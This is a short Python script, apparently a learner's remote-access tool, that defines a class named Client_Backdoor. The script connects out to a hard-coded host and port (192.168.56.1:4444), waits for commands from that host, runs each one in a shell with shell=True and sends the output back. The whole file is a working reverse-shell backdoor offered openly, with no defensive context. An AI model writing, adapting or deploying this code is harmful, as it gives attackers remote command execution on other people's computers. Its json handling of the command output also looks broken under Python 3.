#!/usr/bin/python

import socket
import subprocess
import json



class Client_Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))


    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.sendall(json_data.encode('utf8'))

    def reliable_revice(self):
        json_data = b''
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data.decode('utf8'))
            except ValueError:
                continue


    def exec_cmd(self, cmd):
        if cmd == "exit":
            self.connection.close()
            exit()
        return subprocess.check_output(cmd, shell=True)

    def exec_recived_cmd(self):
        while True:
            command = self.reliable_revice()
            result = self.exec_cmd(command)
            self.reliable_send(result)




my_backdoor = Client_Backdoor("192.168.56.1", 4444)
my_backdoor.exec_recived_cmd()